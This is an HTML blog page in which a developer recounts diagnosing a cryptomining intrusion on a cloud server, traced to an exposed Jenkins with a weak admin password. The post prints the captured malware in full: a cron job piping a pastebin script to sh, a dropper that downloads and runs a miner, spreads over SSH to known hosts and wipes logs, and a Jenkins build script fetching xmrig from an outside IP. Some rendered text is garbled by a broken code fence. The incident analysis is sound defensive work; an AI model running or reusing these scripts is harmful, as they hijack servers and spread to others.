@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="Hi~我是阿金,也可以叫我Arkin,做开发的阿金同学">
+  <meta name="baidu-site-verification" content="KAIz07eWp9" />
+  <meta name="baidu_union_verify" content="89761f418e2e32d488f0c783a8616865">
+  <meta name="keyword" content="阿金,开发,前端,后端,产品,架构师">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      记一次挖矿木马入侵 | Hi,阿金
+    
+  </title>
+  <link href="//cdn.staticfile.org/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdn.staticfile.org/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="/css/style.css">
+  <script src="//cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdn.staticfile.org/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js"></script>
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="/js/qrious.js"></script>
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.staticfile.org/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+</head>
+<div class="wechat-share">
+  <img src="/css/images/logo.svg" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>Hi,阿金 <span class="jumping-dots"><i>.</i><i>.</i><i>.</i></span></span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">首页</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/categories/" class="item-link">分类</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/tags/" class="item-link">标签</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">归档</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">whois</a>
+          
+        </li>
+      
+    </ul>
+
+    
+  <!-- div id="site_search">
+   <div class="form-group">
+    <input type="text" id="local-search-input" autocomplete="off" name="q" results="0" placeholder="search" class="st-search-input st-default-search-input form-control"/>
+   </div>  
+  <div id="local-search-result"></div>
+  </div -->
+
+
+    
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">首页</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/categories/" class="menu-link">分类</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/tags/" class="menu-link">标签</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">归档</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">whois</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>记一次挖矿木马入侵</h2>
+  <div class="post-date">
+    发表:<span> 2019-03-08 </span>
+    分类:
+      <span class="article-category">
+        <a class="article-category-link" href="/categories/DevOps/">DevOps</a>
+      </span>
+    
+  </div>
+  <div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h1 id="记一次比特币病毒排查经过"><a href="#记一次比特币病毒排查经过" class="headerlink" title="记一次比特币病毒排查经过"></a>记一次比特币病毒排查经过</h1><p>这两天开发同事突然反应代码无法上线,经排查是阿里云服务器不能正常git pull 代码.</p>
+<p>开始排查.记录如下.</p>
+<h2 id="排查git"><a href="#排查git" class="headerlink" title="排查git"></a>排查git</h2><p>第一感觉就是可能git问题,代码冲突.</p>
+<ul>
+<li>1.手动pull<br><img src="http://img.hi-arkin.com/2019-03-08-15520447629844.jpg" alt=""></li>
+</ul>
+<p>结果 :连接超时.</p>
+<ul>
+<li><p>2.ping git.xxx.com<br>git.xxx.com 我们自建的git服务器,<br><img src="http://img.hi-arkin.com/2019-03-08-15520449391001.jpg" alt=""><br>结果:git服务器正常.<br>百思不得骑姐,本地git正常使用,其它服务器也正常使用.为什么从这台服务器访问不了22端口呢?<br>考虑: 1,被git服务器防火墙加黑名单;2,这两天阿里云服务器抽风.<br>主观直觉都是把坑扔给别人,谁让你们阿里云可用9999的.</p>
+</li>
+<li><p>3.排查git服务器<br>关闭访问墙,查看黑名单都没有异常.因为git服务器是自建在内网.<br>怀疑是联通又把我们的端口封了,这种事经常有.<br>但使用外网其它服务器访问,都正常.所有把联通排除了.<br>结论: git服务器正常.</p>
+</li>
+</ul>
+<h2 id="所有矛头都指向了阿里云"><a href="#所有矛头都指向了阿里云" class="headerlink" title="所有矛头都指向了阿里云"></a>所有矛头都指向了阿里云</h2><p>但在前一台晚上,重启一下服务器,竟然正常了.<br>你说,阿里不背这个锅,谁背.<br>今天也出问题了,也同样重启,发现不好使.<br>想前几天阿里云监控报警短信,可能我们的服务器真的出问题了.<br>第一感觉,我们没问题,是配置出问题了.于是乎,打开安全配置.</p>
+<p><img src="http://img.hi-arkin.com/2019-03-08-15520461792643.jpg" alt=""><br>公网出,全OK.<br>才想起来看消息,通知.<br><img src="http://img.hi-arkin.com/2019-03-08-15520464024156.jpg" alt=""><br>妈呀,这是要炸啊!打开其中一条.<br><img src="http://img.hi-arkin.com/2019-03-08-15520458650218.jpg" alt=""><br>阿里云把我们的对外22端口屏蔽了.怪不得安全设置都各种没有发现问题.原来是我们服务器在攻击了别人呀.<br>就是中病毒了呗.</p>
+<h2 id="查毒"><a href="#查毒" class="headerlink" title="查毒"></a>查毒</h2><p>进入服务器,病毒或木马最喜欢做的一件事,写定时脚本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br></pre></td></tr></table></figure></p>
+<p>妈呀,一条自动任务,在下载脚本运行呐<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/15 * * * * (curl -fsSL https://pastebin.com/raw/yPRSa0ki||wget -q -O- https://pastebin.com/raw/yPRSa0ki)|sh</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://img.hi-arkin.com/2019-03-08-15520466504218.jpg" alt=""></p>
+<ul>
+<li>先看文件是啥<br><img src="http://img.hi-arkin.com/2019-03-08-15520467519052.jpg" alt=""><br>又下载另一个脚本,脚本内容长这样子</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/bin:/usr/bin:/sbin:/usr/<span class="built_in">local</span>/bin:/usr/sbin</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"*/10 * * * * (curl -fsSL https://pastebin.com/raw/yPRSa0ki||wget -q -O- https://pastebin.com/raw/yPRSa0ki)|sh"</span> | crontab -</span><br><span class="line"></span><br><span class="line">ps -ef|grep -v grep|grep hwlh3wlh44lh|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep Circle_MI|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep get.bi-chi.com|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep hashvault.pro|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep nanopool.org|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep /usr/bin/.sshd|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep /usr/bin/bsd-port|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep <span class="string">"xmr"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep <span class="string">"xig"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep <span class="string">"ddgs"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep <span class="string">"qW3xT"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep <span class="string">"wnTKYg"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep <span class="string">"t00ls.ru"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep <span class="string">"sustes"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep <span class="string">"thisxxs"</span>|awk <span class="string">'&#123;print $2&#125;'</span> | xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep <span class="string">"hashfish"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep <span class="string">"kworkerds"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep <span class="string">"watchdog"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep <span class="string">"/tmp/devtool"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep <span class="string">"systemctI"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep <span class="string">"watchdogs"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep <span class="string">"ksoftirqds"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep <span class="string">"suolbcc"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps aux|grep -v grep|grep -v kintegrityds|awk <span class="string">'&#123;if($3&gt;=80.0) print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">yum -y install coreutils||apt-get -y install coreutils</span><br><span class="line">apt-get install cron -y||yum install crontabs -y||apk add cron -y</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ ! -f <span class="string">"/tmp/.lsdpid"</span> ]; <span class="keyword">then</span></span><br><span class="line">    ARCH=$(uname -m)</span><br><span class="line">    <span class="keyword">if</span> [ <span class="variable">$&#123;ARCH&#125;</span>x = <span class="string">"x86_64x"</span> ]; <span class="keyword">then</span></span><br><span class="line">        (curl -fsSL http://sowcar.com/t6/677/1551954043x2890211684.jpg -o /tmp/kthrotlds||wget -q http://sowcar.com/t6/677/1551954043x2890211684.jpg -O /tmp/kthrotlds) &amp;&amp; chmod +x /tmp/kthrotlds</span><br><span class="line">    <span class="keyword">elif</span> [ <span class="variable">$&#123;ARCH&#125;</span>x = <span class="string">"i686x"</span> ]; <span class="keyword">then</span></span><br><span class="line">        (curl -fsSL http://sowcar.com/t6/677/1551954069x2890211684.jpg -o /tmp/kthrotlds||wget -q http://sowcar.com/t6/677/1551954069x2890211684.jpg -O /tmp/kthrotlds) &amp;&amp; chmod +x /tmp/kthrotlds</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        (curl -fsSL http://sowcar.com/t6/677/1551954069x2890211684.jpg -o /tmp/kthrotlds||wget -q http://sowcar.com/t6/677/1551954069x2890211684.jpg -O /tmp/kthrotlds) &amp;&amp; chmod +x /tmp/kthrotlds</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">        nohup /tmp/kthrotlds &gt;/dev/null 2&gt;&amp;1 &amp;</span><br><span class="line"><span class="keyword">elif</span> [ ! -f <span class="string">"/proc/<span class="variable">$(cat /tmp/.lsdpid)</span>/stat"</span> ]; <span class="keyword">then</span></span><br><span class="line">    ARCH=$(uname -m)</span><br><span class="line">    <span class="keyword">if</span> [ <span class="variable">$&#123;ARCH&#125;</span>x = <span class="string">"x86_64x"</span> ]; <span class="keyword">then</span></span><br><span class="line">        (curl -fsSL http://sowcar.com/t6/677/1551954043x2890211684.jpg -o /tmp/kthrotlds||wget -q http://sowcar.com/t6/677/1551954043x2890211684.jpg -O /tmp/kthrotlds) &amp;&amp; chmod +x /tmp/kthrotlds</span><br><span class="line">    <span class="keyword">elif</span> [ <span class="variable">$&#123;ARCH&#125;</span>x = <span class="string">"i686x"</span> ]; <span class="keyword">then</span></span><br><span class="line">        (curl -fsSL http://sowcar.com/t6/677/1551954069x2890211684.jpg -o /tmp/kthrotlds||wget -q http://sowcar.com/t6/677/1551954069x2890211684.jpg -O /tmp/kthrotlds) &amp;&amp; chmod +x /tmp/kthrotlds</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        (curl -fsSL http://sowcar.com/t6/677/1551954069x2890211684.jpg -o /tmp/kthrotlds||wget -q http://sowcar.com/t6/677/1551954069x2890211684.jpg -O /tmp/kthrotlds) &amp;&amp; chmod +x /tmp/kthrotlds</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">        nohup /tmp/kthrotlds &gt;/dev/null 2&gt;&amp;1 &amp;</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -f /root/.ssh/known_hosts ] &amp;&amp; [ -f /root/.ssh/id_rsa.pub ]; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">for</span> h <span class="keyword">in</span> $(grep -oE <span class="string">"\b([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b"</span> /root/.ssh/known_hosts); <span class="keyword">do</span> ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no <span class="variable">$h</span> <span class="string">'(curl -fsSL https://pastebin.com/raw/yPRSa0ki||wget -q -O- https://pastebin.com/raw/yPRSa0ki)|sh &gt;/dev/null 2&gt;&amp;1 &amp;'</span> &amp; <span class="keyword">done</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 0&gt;/var/spool/mail/root</span><br><span class="line"><span class="built_in">echo</span> 0&gt;/var/<span class="built_in">log</span>/wtmp</span><br><span class="line"><span class="built_in">echo</span> 0&gt;/var/<span class="built_in">log</span>/secure</span><br><span class="line"><span class="built_in">echo</span> 0&gt;/var/<span class="built_in">log</span>/cron</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p>就是下载脚本和文件,没有安装crontab就自动帮你安装,添加免密码登录等等.</p>
+<p>那么 <a href="https://pastebin.com/" target="_blank" rel="noopener">https://pastebin.com/</a> 是什么网站?<br><img src="http://img.hi-arkin.com/2019-03-08-15520473297439.jpg" alt=""></p>
+<p>就是一个可以匿名在线使用的代码风格化工具,肯定木马使用者不会傻到拿自己服务器作脚本下载的.<br>为什么是这个网站呢?<br>1.可以匿名,记得国内有用豆瓣网做脚本的,查不到就怪了.<br>2.可以使用Raw源代码输出;<br><img src="http://img.hi-arkin.com/2019-03-08-15520476513107.jpg" alt=""></p>
+<p><img src="http://img.hi-arkin.com/2019-03-08-15520476685507.jpg" alt=""><br>随便一个人都可以在线写东西.<br>所有到这里,基本上是找不到任何有用的东西.</p>
+<h2 id="找根源"><a href="#找根源" class="headerlink" title="找根源"></a>找根源</h2><p>这脚本怎么来的?难道我们root密码泄漏了么?<br>之前xshell被种后门,记忆犹新.我们也中招过.<br>但怀疑是怀疑还得有根据.<br>清空crontab后,又几分钟自动创建,完全清不掉呐.</p>
+<ul>
+<li>查看对外网络情况<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="http://img.hi-arkin.com/2019-03-08-15520478290815.jpg" alt=""><br>段错误,显示不全,这个netstat 可能查不了.<br>换个方向,使用ss命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ss</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://img.hi-arkin.com/2019-03-08-15520480017257.jpg" alt=""><br>有两个明显的不熟悉的IP地址,因为我们服务IP地址少,一眼就能看出来异类的.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">193.56.28.19</span><br><span class="line">134.209.104.20</span><br></pre></td></tr></table></figure>
+<p><img src="http://img.hi-arkin.com/2019-03-08-15520481448805.jpg" alt=""></p>
+<p><img src="http://img.hi-arkin.com/2019-03-08-15520481279843.jpg" alt=""></p>
+<p>这些端口都在变化,随机的:<br>找到一个 <figure class="highlight plain"><figcaption><span>``` </span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![](http://img.hi-arkin.com/2019-03-08-15520487278687.jpg)</span><br><span class="line"></span><br><span class="line">查看一下进程.</span><br><span class="line">关键字 trace</span><br></pre></td></tr></table></figure></p>
+<p>./trace<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">搜索一下文件</span><br><span class="line">![](http://img.hi-arkin.com/2019-03-08-15520488808330.jpg)</span><br><span class="line"></span><br><span class="line">这不是jenkins的工作目录么.</span><br><span class="line">到这里我已经清楚来源了.</span><br><span class="line">jenkins是我布署的,我很清楚他的危害,想考侥幸混过去,等闲下来再去整理,没想到来得那么快.</span><br><span class="line"></span><br><span class="line">## Jenkins 自食其恶果</span><br><span class="line"></span><br><span class="line">![](http://img.hi-arkin.com/2019-03-08-15520491414252.jpg)</span><br><span class="line">登录jenkins后台,第一个任务就是这玩意,左下角任务不停的运行着.</span><br><span class="line">![](http://img.hi-arkin.com/2019-03-08-15520492031184.jpg)</span><br><span class="line"></span><br><span class="line">我们看一下,他都执行什么脚本.</span><br><span class="line">触发器</span><br><span class="line">![](http://img.hi-arkin.com/2019-03-08-15520492722210.jpg)</span><br><span class="line">每分钟运行一次,&quot;H&quot; 表示,hash.意思尽可能在每分钟内执行一个Job.执行完成,等下一分钟.</span><br><span class="line"></span><br><span class="line">看一下构建脚本</span><br><span class="line">![](http://img.hi-arkin.com/2019-03-08-15520495270442.jpg)</span><br><span class="line">贴一个完整的</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">#!/bin/bash</span><br><span class="line">if [[ $(whoami) != &quot;root&quot; ]]; then</span><br><span class="line">    for tr in $(ps -U $(whoami) | egrep -v &quot;java|ps|sh|egrep|grep|PID&quot; | cut -b1-6); do</span><br><span class="line">        kill -9 $tr || : ;</span><br><span class="line">    done;</span><br><span class="line">else </span><br><span class="line">    echo 128 &gt; /proc/sys/vm/nr_hugepages;</span><br><span class="line">    sysctl -w vm.nr_hugepages=128;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">threadCount=$(lscpu | grep &apos;CPU(s)&apos; | grep -v &apos;,&apos; | awk &apos;&#123;print $2&#125;&apos; | head -n 1);</span><br><span class="line">hostHash=$(hostname -f | md5sum | cut -c1-8);</span><br><span class="line">echo &quot;$&#123;hostHash&#125; - $&#123;threadCount&#125;&quot;;</span><br><span class="line"></span><br><span class="line">_curl () &#123;</span><br><span class="line">  read proto server path &lt;&lt;&lt;$(echo $&#123;1//// &#125;)</span><br><span class="line">  DOC=/$&#123;path// //&#125;</span><br><span class="line">  HOST=$&#123;server//:*&#125;</span><br><span class="line">  PORT=$&#123;server//*:&#125;</span><br><span class="line">  [[ x&quot;$&#123;HOST&#125;&quot; == x&quot;$&#123;PORT&#125;&quot; ]] &amp;&amp; PORT=80</span><br><span class="line"></span><br><span class="line">  exec 3&lt;&gt;/dev/tcp/$&#123;HOST&#125;/$PORT</span><br><span class="line">  echo -en &quot;GET $&#123;DOC&#125; HTTP/1.0\r\nHost: $&#123;HOST&#125;\r\n\r\n&quot; &gt;&amp;3</span><br><span class="line">  (while read line; do</span><br><span class="line">   [[ &quot;$line&quot; == $&apos;\r&apos; ]] &amp;&amp; break</span><br><span class="line">  done &amp;&amp; cat) &lt;&amp;3</span><br><span class="line">  exec 3&gt;&amp;-</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rm -rf config.json;</span><br><span class="line"></span><br><span class="line">d () &#123;</span><br><span class="line">	curl -L --insecure --connect-timeout 10 --max-time 55 --fail $1 -o $2 2&gt; /dev/null || wget --no-check-certificate --timeout 55 --tries 2 $1 -O $2 2&gt; /dev/null || _curl $1 &gt; $2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">test ! -s trace &amp;&amp; \</span><br><span class="line">    d http://193.56.28.19:52343/xmrig.tar.gz trace.tgz trace.tgz &amp;&amp; \</span><br><span class="line">    tar -zxvf trace.tgz &amp;&amp; \</span><br><span class="line">    mv xmrig trace &amp;&amp; \</span><br><span class="line">    rm -rf trace.tgz;</span><br><span class="line"></span><br><span class="line">test ! -x trace &amp;&amp; chmod +x trace;</span><br><span class="line"></span><br><span class="line">k() &#123;</span><br><span class="line">    ./trace \</span><br><span class="line">        -r 2 \</span><br><span class="line">        -R 2 \</span><br><span class="line">        --keepalive \</span><br><span class="line">        --no-color \</span><br><span class="line">		--nicehash \</span><br><span class="line">        --donate-level 0 \</span><br><span class="line">        --cpu-priority 3 \</span><br><span class="line">        --print-time 10 \</span><br><span class="line">        --threads $&#123;threadCount:-4&#125; \</span><br><span class="line">        --url $1 \</span><br><span class="line">        --user P \</span><br><span class="line">        --pass X \</span><br><span class="line">        --keepalive</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">k 193.56.28.19:8080 || k 193.56.28.19:8080</span><br></pre></td></tr></table></figure></p>
+<p>开启代理服务这些都不是关键,关键是<br>下载<br><code>http://193.56.28.19:52343/xmrig.tar.gz</code><br>这个文件.<br>xmrig查一下就知道<br><img src="http://img.hi-arkin.com/2019-03-08-15520496854405.jpg" alt=""></p>
+<p>这个就是比特币病毒.<br>至此就结束了,剩下就是清空病毒,修改系统,最简单的方法,利用阿里云的镜像加回滚.</p>
+<p>关于我们jenkin问题:</p>
+<ol>
+<li>为了方便远程,我开启了公网访问</li>
+<li>最关键还被搜索引擎收录了</li>
+<li>管理员密码太简单了</li>
+<li>为了方便运行脚本,把Jenkins的运行权限设太高</li>
+<li>jenkin连接着所有服务器,攻破它就相当于攻破了城堡.</li>
+</ol>
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#DevOps" >
+    <span class="tag-code">DevOps</span>
+  </a>
+
+  <a href="/tags#Linux" >
+    <span class="tag-code">Linux</span>
+  </a>
+
+  <a href="/tags#Jekins" >
+    <span class="tag-code">Jekins</span>
+  </a>
+
+  <a href="/tags#xmrig" >
+    <span class="tag-code">xmrig</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2019/03/04/Javascript/routerlister/">
+        <span class="nav-arrow">← </span>
+        
+          路由事件
+        
+      </a>
+    
+    
+  </div>
+
+    <!-- NAV END -->
+
+    <!-- 二维码 START -->
+    
+      <div class="qrcode">
+        <canvas id="share-qrcode"></canvas>
+        <p class="notice">扫描二维码，分享此文章</p>
+      </div>
+    
+    <!-- 二维码 END -->
+    
+      <!-- No Comment -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#记一次比特币病毒排查经过"><span class="toc-nav-text">记一次比特币病毒排查经过</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#排查git"><span class="toc-nav-text">排查git</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#所有矛头都指向了阿里云"><span class="toc-nav-text">所有矛头都指向了阿里云</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#查毒"><span class="toc-nav-text">查毒</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#找根源"><span class="toc-nav-text">找根源</span></a></li></ol></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'https://arkin-j.github.io/2019/03/08/DevOps/xmrig_script/';
